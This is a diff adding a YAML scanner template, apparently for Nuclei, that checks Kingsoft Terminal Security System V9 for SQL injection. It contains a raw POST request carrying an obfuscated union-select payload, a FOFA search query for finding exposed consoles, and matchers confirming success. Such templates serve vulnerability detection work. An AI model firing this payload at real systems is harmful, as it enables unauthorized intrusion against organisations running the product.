@@ -1,0 +1,35 @@
+id: jinshan-zhongduan-V9-sqli
+
+info:
+  name: jinshan-zhongduan-V9-sqli
+  author: jdllt
+  severity: high
+  description: 金山终端安全系统是一款为企业提供终端防护的安全产品，针对恶意软件、病毒和外部攻击提供防范措施，帮助维护企业数据和网络，金山终端安全系统V9存在SQL注入。
+  tags: jinshan-zhongduan-V9,sqli
+  metadata:
+    fofa-qeury: title=="用户登录-金山终端安全系统V9.0Web控制台"
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        POST /inter/update_software_info_v2.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 87
+
+        type=--1E0union/**/se#lect-1E0,2,1,20231019,5,6,7,8--&key=123&pageCount=1&curPage=1
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "20231019"
+      - type: status
+        status:
+          - 200
